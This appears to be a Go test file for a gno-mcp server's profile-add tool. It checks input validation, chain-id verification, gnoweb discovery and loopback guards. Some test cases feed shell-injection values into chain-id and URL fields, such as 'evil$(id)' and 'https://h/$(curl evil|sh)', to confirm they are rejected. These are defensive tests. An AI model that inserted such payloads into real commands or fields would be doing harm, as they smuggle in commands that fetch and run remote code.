package admin

import (
	"context"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/gnoverse/gno-mcp/internal/profiles"
	"github.com/gnoverse/gno-mcp/internal/server"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// newAdminServer builds a Server whose init profiles are the builtins
// (local + testnet), mirroring a zero-config boot.
func newAdminServer(t *testing.T) *server.Server {
	t.Helper()
	cfg := &profiles.Config{Profiles: profiles.BuiltinProfiles()}
	_, err := cfg.Validate()
	require.NoError(t, err)
	return server.NewServer(cfg, "")
}

// okVerifier reports chainID for every rpc-url and counts invocations.
func okVerifier(chainID string, calls *int) ChainIDVerifier {
	return func(_ context.Context, _ string) (string, error) {
		if calls != nil {
			*calls++
		}
		return chainID, nil
	}
}

func callAdd(t *testing.T, s *server.Server, args map[string]any) (server.Result, error) {
	t.Helper()
	return s.Registry().Call(context.Background(), "gno_profile_add", args)
}

func toolErrCode(t *testing.T, err error) string {
	t.Helper()
	var te *server.ToolError
	require.ErrorAs(t, err, &te, "expected a structured ToolError, got: %v", err)
	return te.Code
}

// gnowebServer serves a gnoweb-shaped page advertising rpc/chainid meta tags.
func gnowebServer(t *testing.T, rpc, chainID string) *httptest.Server {
	t.Helper()
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, `<meta name="gnoconnect:rpc" content="%s" /><meta name="gnoconnect:chainid" content="%s" />`, rpc, chainID)
	}))
}

// ---- happy paths

func TestProfileAdd_explicitForm(t *testing.T) {
	s := newAdminServer(t)
	calls := 0
	added := 0
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test-42", &calls), func() error { added++; return nil })

	res, err := callAdd(t, s, map[string]any{
		"name": "test42", "rpc_url": "https://rpc.example", "chain_id": "test-42",
	})
	require.NoError(t, err)

	p, ok := s.Config().Profiles["test42"]
	require.True(t, ok, "profile must be registered")
	assert.Equal(t, "test-42", p.ChainID)
	assert.Equal(t, 1, calls, "verifier must run exactly once")
	assert.Equal(t, 1, added, "onAdded must run exactly once")

	require.NotNil(t, res.StructuredContent)
	assert.Equal(t, "test42", res.StructuredContent["name"])
	assert.Equal(t, "test-42", res.StructuredContent["chain_id"])
	assert.Equal(t, "explicit", res.StructuredContent["source"])
	assert.Equal(t, false, res.StructuredContent["persisted"])
	assert.Contains(t, res.StructuredContent["persist_command"], "gnomcp profile add test42 --rpc https://rpc.example --chain-id test-42")
	assert.Contains(t, res.Text, "restart", "text must say the profile is in-memory until restart")
}

// A freshly added profile is usable by name immediately (the server validates
// against config, not the schema enum). The result must say so and point at the
// tool-list refresh, so a client with a cached profile enum doesn't waste a
// round-trip assuming the profile is unavailable.
func TestProfileAdd_resultNudgesImmediateUse(t *testing.T) {
	s := newAdminServer(t)
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test-42", nil), func() error { return nil })

	res, err := callAdd(t, s, map[string]any{
		"name": "test42", "rpc_url": "https://rpc.example", "chain_id": "test-42",
	})
	require.NoError(t, err)
	assert.Contains(t, res.Text, "profile=test42", "must show how to use it now")
	assert.Contains(t, res.Text, "re-fetch", "must point at the tool-list refresh for a stale enum")
}

func TestProfileAdd_explicitForm_optionalURLs(t *testing.T) {
	s := newAdminServer(t)
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test-42", nil), func() error { return nil })

	res, err := callAdd(t, s, map[string]any{
		"name": "test42", "rpc_url": "https://rpc.example", "chain_id": "test-42",
		"tx_indexer_url":     "https://idx.example/graphql",
		"faucet_service_url": "http://127.0.0.1:8590",
		"faucet_url":         "https://faucet.example",
	})
	require.NoError(t, err)
	p := s.Config().Profiles["test42"]
	assert.Equal(t, "https://idx.example/graphql", p.TxIndexerURL)
	assert.Equal(t, "http://127.0.0.1:8590", p.FaucetServiceURL)
	assert.Equal(t, "https://faucet.example", p.FaucetURL)
	assert.Contains(t, res.StructuredContent["persist_command"], "--indexer-url https://idx.example/graphql")
}

func TestProfileAdd_gnowebForm(t *testing.T) {
	gw := gnowebServer(t, "https://rpc.test42.testnets.gno.land", "test-42")
	defer gw.Close()

	s := newAdminServer(t)
	RegisterProfileAdd(s, gw.Client(), okVerifier("test-42", nil), func() error { return nil })

	res, err := callAdd(t, s, map[string]any{"name": "eleven", "gnoweb_url": gw.URL})
	require.NoError(t, err)
	p, ok := s.Config().Profiles["eleven"]
	require.True(t, ok)
	assert.Equal(t, "test-42", p.ChainID)
	assert.Equal(t, "https://rpc.test42.testnets.gno.land", p.RPCURL)
	assert.Equal(t, "gnoweb", res.StructuredContent["source"])
}

func TestProfileAdd_reAddDynamicNameReplaces(t *testing.T) {
	s := newAdminServer(t)
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test-42", nil), func() error { return nil })

	_, err := callAdd(t, s, map[string]any{"name": "test42", "rpc_url": "https://rpc.one", "chain_id": "test-42"})
	require.NoError(t, err)
	_, err = callAdd(t, s, map[string]any{"name": "test42", "rpc_url": "https://rpc.two", "chain_id": "test-42"})
	require.NoError(t, err, "re-adding a dynamically added profile must be allowed")
	assert.Equal(t, "https://rpc.two", s.Config().Profiles["test42"].RPCURL)
}

// ---- argument-form validation

func TestProfileAdd_rejectsAmbiguousOrMissingForms(t *testing.T) {
	s := newAdminServer(t)
	calls := 0
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test5", &calls), func() error { return nil })

	cases := []map[string]any{
		{"name": "x5"}, // neither form
		{"name": "x5", "rpc_url": "https://rpc.example"}, // form A missing chain_id
		{"name": "x5", "chain_id": "test5"},              // form A missing rpc_url
		{"name": "x5", "gnoweb_url": "https://gw.example", "rpc_url": "https://rpc.example", "chain_id": "test5"}, // both forms
	}
	for _, args := range cases {
		_, err := callAdd(t, s, args)
		require.Error(t, err, "args %v must be rejected", args)
		assert.Equal(t, "invalid_arguments", toolErrCode(t, err), "args %v", args)
	}
	assert.Zero(t, calls, "verifier must not run on invalid arguments")
}

func TestProfileAdd_rejectsBadNames(t *testing.T) {
	s := newAdminServer(t)
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test5", nil), func() error { return nil })

	for name, wantCode := range map[string]string{
		"":          "invalid_profile_name",
		"Has Space": "invalid_profile_name",
		"x;y":       "invalid_profile_name",
		"default":   "profile_reserved",
		"testnet":   "profile_immutable", // builtin (init) profile
		"local":     "profile_immutable",
	} {
		_, err := callAdd(t, s, map[string]any{"name": name, "rpc_url": "https://rpc.example", "chain_id": "test5"})
		require.Error(t, err, "name %q must be rejected", name)
		assert.Equal(t, wantCode, toolErrCode(t, err), "name %q", name)
	}
}

// ---- profile validation

// A non-test chain-id (betanet/mainnet/staging) is admitted read-only: the
// profile is added, flagged read-only, with no agent key/faucet/write path.
func TestProfileAdd_admitsReadOnlyChain(t *testing.T) {
	for _, chainID := range []string{"gnoland1", "staging", "mychain"} {
		s := newAdminServer(t)
		RegisterProfileAdd(s, http.DefaultClient, okVerifier(chainID, nil), func() error { return nil })

		res, err := callAdd(t, s, map[string]any{"name": "ro", "rpc_url": "https://rpc.example", "chain_id": chainID})
		require.NoError(t, err, "read-only chain-id %q must be admitted", chainID)
		assert.Equal(t, true, res.StructuredContent["read_only"], "chain-id %q", chainID)
		assert.True(t, s.Config().Profiles["ro"].IsReadOnly(), "chain-id %q must classify read-only", chainID)
	}
}

// A malformed chain-id (shell metacharacters/whitespace) is refused before any
// network verify — it would be interpolated into the pasted persist command.
func TestProfileAdd_rejectsMalformedChainID(t *testing.T) {
	s := newAdminServer(t)
	calls := 0
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("whatever", &calls), func() error { return nil })

	for _, chainID := range []string{"up;rm", "a b", "evil$(id)"} {
		_, err := callAdd(t, s, map[string]any{"name": "x5", "rpc_url": "https://rpc.example", "chain_id": chainID})
		require.Error(t, err, "chain-id %q must be rejected", chainID)
		assert.Equal(t, "chain_id_malformed", toolErrCode(t, err), "chain-id %q", chainID)
	}
	assert.Zero(t, calls, "verifier must not run for a malformed chain-id")
}

func TestProfileAdd_rejectsBadRPCURL(t *testing.T) {
	s := newAdminServer(t)
	calls := 0
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test5", &calls), func() error { return nil })

	for _, rpc := range []string{"tcp://127.0.0.1:26657", "not-a-url", "http://h/$(cmd)", "ftp://h/x"} {
		_, err := callAdd(t, s, map[string]any{"name": "x5", "rpc_url": rpc, "chain_id": "test5"})
		require.Error(t, err, "rpc-url %q must be rejected", rpc)
		assert.Equal(t, "invalid_rpc_url", toolErrCode(t, err), "rpc-url %q", rpc)
	}
	assert.Zero(t, calls, "verifier must not run for a malformed rpc-url")
}

func TestProfileAdd_rejectsBadIndexerURL(t *testing.T) {
	s := newAdminServer(t)
	calls := 0
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test5", &calls), func() error { return nil })

	// tx_indexer_url is interpolated into the paste-ready persist_command, so
	// it must pass the same shell-safe gate as rpc_url.
	for _, idx := range []string{"https://h/$(curl evil|sh)", "https://h/a b", "ftp://idx.example", "https://h/;id"} {
		_, err := callAdd(t, s, map[string]any{
			"name": "x5", "rpc_url": "https://rpc.example", "chain_id": "test5",
			"tx_indexer_url": idx,
		})
		require.Error(t, err, "tx_indexer_url %q must be rejected", idx)
		assert.Equal(t, "invalid_indexer_url", toolErrCode(t, err), "tx_indexer_url %q", idx)
	}
	assert.Zero(t, calls, "verifier must not run for a malformed tx_indexer_url")
}

func TestProfileAdd_rejectsBadFaucetURL(t *testing.T) {
	s := newAdminServer(t)
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test5", nil), func() error { return nil })

	_, err := callAdd(t, s, map[string]any{
		"name": "x5", "rpc_url": "https://rpc.example", "chain_id": "test5",
		"faucet_url": "ftp://faucet.example",
	})
	require.Error(t, err)
	assert.Equal(t, "invalid_config", toolErrCode(t, err))
}

// ---- live verification

func TestProfileAdd_unreachableChain(t *testing.T) {
	s := newAdminServer(t)
	RegisterProfileAdd(s, http.DefaultClient,
		func(_ context.Context, _ string) (string, error) { return "", errors.New("dial refused") },
		func() error { return nil })

	_, err := callAdd(t, s, map[string]any{"name": "x5", "rpc_url": "https://rpc.example", "chain_id": "test5"})
	require.Error(t, err)
	assert.Equal(t, "chain_unreachable", toolErrCode(t, err))
	_, ok := s.Config().Profiles["x5"]
	assert.False(t, ok, "profile must NOT be added when the chain is unreachable")
}

func TestProfileAdd_chainIDMismatch(t *testing.T) {
	s := newAdminServer(t)
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("dev", nil), func() error { return nil })

	_, err := callAdd(t, s, map[string]any{"name": "x5", "rpc_url": "https://rpc.example", "chain_id": "test5"})
	require.Error(t, err)
	var te *server.ToolError
	require.ErrorAs(t, err, &te)
	assert.Equal(t, "chain_id_mismatch", te.Code)
	assert.Equal(t, "test5", te.Extra["declared"])
	assert.Equal(t, "dev", te.Extra["reported"])
	_, ok := s.Config().Profiles["x5"]
	assert.False(t, ok, "profile must NOT be added on a chain-id mismatch")
}

// ---- gnoweb distrust

func TestProfileAdd_gnowebWithoutMetaTags(t *testing.T) {
	gw := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("<html><head><title>not gnoweb</title></head></html>"))
	}))
	defer gw.Close()

	s := newAdminServer(t)
	RegisterProfileAdd(s, gw.Client(), okVerifier("test5", nil), func() error { return nil })

	_, err := callAdd(t, s, map[string]any{"name": "x5", "gnoweb_url": gw.URL})
	require.Error(t, err)
	var te *server.ToolError
	require.ErrorAs(t, err, &te)
	assert.Equal(t, "gnoweb_discovery_failed", te.Code)
	assert.Contains(t, te.Message, "rpc_url", "error must suggest the explicit rpc_url+chain_id fallback")
}

// gnowebRPCUnusable is the loopback guard: a non-loopback gnoweb page
// advertising a loopback RPC is a misconfigured deployment (observed live on
// gnoweb.test-42.gnoland.network advertising 127.0.0.1) — and dialing the
// agent's own localhost on a remote page's say-so is not acceptable.
func TestGnowebRPCUnusable(t *testing.T) {
	cases := []struct {
		gnoweb, rpc string
		want        bool
	}{
		{"https://gnoweb.test-42.gnoland.network/", "http://127.0.0.1:26657", true},
		{"https://gnoweb.test-42.gnoland.network/", "http://localhost:26657", true},
		{"https://gnoweb.test-42.gnoland.network/", "http://[::1]:26657", true},
		{"https://gnoweb.test-42.gnoland.network/", "http://0.0.0.0:26657", true},
		{"https://gnoweb.test-42.gnoland.network/", "https://rpc.test-42-aeddi-1.gnoland.network", false},
		{"http://127.0.0.1:8888/", "http://127.0.0.1:26657", false}, // local gnodev: loopback gnoweb may advertise loopback rpc
		{"http://localhost:8888/", "http://127.0.0.1:26657", false},
	}
	for _, tc := range cases {
		assert.Equal(t, tc.want, gnowebRPCUnusable(tc.gnoweb, tc.rpc), "gnoweb=%s rpc=%s", tc.gnoweb, tc.rpc)
	}
}

func TestProfileAdd_gnowebOversizedMetaValuesAreBounded(t *testing.T) {
	// A malicious gnoweb page can stuff ~1 MiB into a meta-tag; the error
	// channels must not echo it back unbounded.
	huge := strings.Repeat("a", 1<<20)
	gw := gnowebServer(t, "https://"+huge+".example", huge)
	defer gw.Close()

	s := newAdminServer(t)
	RegisterProfileAdd(s, gw.Client(), okVerifier("test5", nil), func() error { return nil })

	_, err := callAdd(t, s, map[string]any{"name": "x5", "gnoweb_url": gw.URL})
	require.Error(t, err)
	var te *server.ToolError
	require.ErrorAs(t, err, &te)
	assert.Less(t, len(te.Message), 1024, "error message must not echo megabytes of page-derived bytes")
	for k, v := range te.Extra {
		if sv, ok := v.(string); ok {
			assert.Less(t, len(sv), 1024, "Extra[%s] must be bounded", k)
		}
	}
}

func TestProfileAdd_gnowebLoopbackRPCFromLoopbackGnowebAllowed(t *testing.T) {
	// Local gnodev case: the gnoweb page itself is on loopback, so a loopback
	// RPC is expected and allowed.
	gw := gnowebServer(t, "http://127.0.0.1:26657", "dev")
	defer gw.Close()

	s := newAdminServer(t)
	RegisterProfileAdd(s, gw.Client(), okVerifier("dev", nil), func() error { return nil })

	_, err := callAdd(t, s, map[string]any{"name": "mydev", "gnoweb_url": gw.URL})
	require.NoError(t, err, "loopback rpc from a loopback gnoweb must be allowed")
	assert.Equal(t, "http://127.0.0.1:26657", s.Config().Profiles["mydev"].RPCURL)
}

// ---- republish

func TestProfileAdd_onAddedFailureKeepsProfile(t *testing.T) {
	s := newAdminServer(t)
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test5", nil),
		func() error { return errors.New("publish exploded") })

	_, err := callAdd(t, s, map[string]any{"name": "x5", "rpc_url": "https://rpc.example", "chain_id": "test5"})
	require.Error(t, err)
	var te *server.ToolError
	require.ErrorAs(t, err, &te)
	assert.Equal(t, "republish_failed", te.Code)
	assert.Contains(t, te.Message, "usable", "message must state the profile was added and is usable")
	_, ok := s.Config().Profiles["x5"]
	assert.True(t, ok, "profile must remain added even when republish fails")
}

// ---- registration shape

func TestProfileAdd_toolShape(t *testing.T) {
	s := newAdminServer(t)
	RegisterProfileAdd(s, http.DefaultClient, okVerifier("test5", nil), func() error { return nil })

	tool, ok := s.Registry().Get("gno_profile_add")
	require.True(t, ok)
	assert.Equal(t, server.CapWritePrep, tool.Capability)
	assert.False(t, tool.Annotations.ReadOnly)
	assert.False(t, tool.Annotations.Destructive)
	assert.True(t, tool.Annotations.Idempotent, "same-args re-add converges, so retry must be advertised as safe")
	assert.True(t, tool.Annotations.OpenWorld)

	props, ok := tool.InputSchema["properties"].(map[string]any)
	require.True(t, ok)
	_, hasProfile := props["profile"]
	assert.False(t, hasProfile, "schema must not declare a 'profile' arg (applyProfileDefault would inject one)")
	assert.Equal(t, false, tool.InputSchema["additionalProperties"])
}
